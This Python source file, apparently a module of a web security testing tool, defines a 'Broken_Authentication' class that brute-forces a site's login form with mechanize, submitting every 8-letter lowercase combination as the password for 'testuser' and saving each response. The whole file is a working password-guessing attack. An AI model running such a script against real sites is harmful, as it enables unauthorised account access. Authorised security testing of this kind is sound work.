import mechanize
import mechanize
from itertools import combinations
from string import ascii_lowercase


class Broken_Authentication():

    def __init__(self, url):
        self._url = url
        self._status = False

    def get_status(self):
        return self._status

    def run_tests(self):
        url = self._url
        browser = mechanize.Browser()
        attackNumber = 1
        # Possible password list
        passwords = (p for p in combinations(ascii_lowercase, 8))
        for p in passwords:
            browser.open(url)
            browser.select_form(nr=0)
            browser["login"] = 'testuser'
            browser["passwd"] = ''.join(p)
            res = browser.submit()
            content = res.read()
            # Print response code
            print(res.code)
            if content.find('<input type="password" name="passwd" />') > 0:
                print("Login failed")
            else:
                self._status = True
            # Write response to file
            output = open('response/' + str(attackNumber) + '.txt', 'w')
            output.write(content)
            output.close()
            attackNumber += 1